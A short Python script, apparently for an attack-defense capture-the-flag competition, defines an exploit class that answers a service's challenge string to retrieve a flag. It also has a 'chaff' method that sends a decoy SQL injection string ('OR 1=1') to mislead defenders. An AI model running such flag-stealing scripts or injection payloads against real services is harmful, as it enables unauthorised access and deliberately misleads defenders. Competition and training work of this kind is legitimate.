#!/usr/bin/env python3

from Exploit import Exploit

class Challenge_Response_Exploit(Exploit):
    def __init__(self, ip, port, name="", debug=False, debug_chaff=False):
        super().__init__(ip, port, name, debug, debug_chaff)


    def launch_exploit(self):
        recv_msg = self.recv_until('\n')
        hex_string = recv_msg.split(':',1)[1]
        self.send(hex_string+'\n', self.sock)
        flag = self.recv_until('\n').split(': ',1)[1].strip()
        return flag


    def launch_chaff(self):
        #This is where you would write a fake exploit that does not really
        #work, but looks real enough to cause them to waste time looking for
        #the real exploit.
        recv_msg = self.recv_until('\n')
        self.send("') OR 1=1; SELECT Flag from users;'"+'\n', self.sock)
